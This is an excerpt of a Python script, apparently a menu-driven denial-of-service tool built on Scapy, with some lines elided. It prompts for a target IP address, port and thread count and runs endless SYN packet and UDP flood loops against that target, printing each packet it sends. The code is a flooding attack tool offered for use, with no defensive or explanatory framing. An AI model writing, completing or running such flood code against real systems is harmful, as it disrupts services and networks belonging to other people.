...
═══> """ + TextColors.RESET)
        ...
        if select == "1" or select.lower() == "1":
            def send_packets(target_ip, target_port):
                while True:
                    ...
                    pkt = ip / tcp / byte
                    send(pkt, verbose=0)
                    print(TextColors.LIGHT_GREEN + f"[+] IP Address : {target_ip} [+] SYN Packet : {pkt.summary()}"+ TextColors.RESET)
                    time.sleep(0.01)
            ...
            target_ip = input(TextColors.LIGHT_RED + "IP > "+ TextColors.RESET)  
            target_port = int(input(TextColors.LIGHT_RED + "Port > "+ TextColors.RESET))  
            thread_count = int(input(TextColors.LIGHT_RED + "Thread > "+ TextColors.RESET))  
            ...
            def udp_flood(target_ip, target_port):
                while True:
                    ...
                    pkt = ip / udp / byte
                    send(pkt, verbose=0)
                    print(TextColors.LIGHT_GREEN + f"[+] IP Address : {target_ip} [+] UDP Packet : {pkt.summary()}" + TextColors.RESET)
        ...
        elif select == "3" or select.lower() == "2":
            sys.exit()
